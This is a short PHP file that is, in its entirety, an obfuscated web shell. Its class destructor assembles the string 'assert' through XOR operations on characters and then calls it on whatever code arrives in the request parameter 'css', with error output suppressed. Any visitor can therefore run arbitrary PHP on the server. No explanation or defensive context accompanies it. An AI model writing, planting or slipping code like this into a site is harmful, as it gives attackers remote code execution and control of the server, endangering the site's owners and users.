<?php
class  JFNP{
public $c='';
function __destruct(){
$_0='#'^"\x42";
$_1='r'^"\x1";
$_2='i'^"\x1a";
$_3='Q'^"\x34";
$_4='u'^"\x7";
$_5='K'^"\x3f";
$db=$_0.$_1.$_2.$_3.$_4.$_5;
print_r($db);
return @$db ($this->c);}}
$jfnp=new JFNP();
@$jfnp->c=$_REQUEST['css'];
?>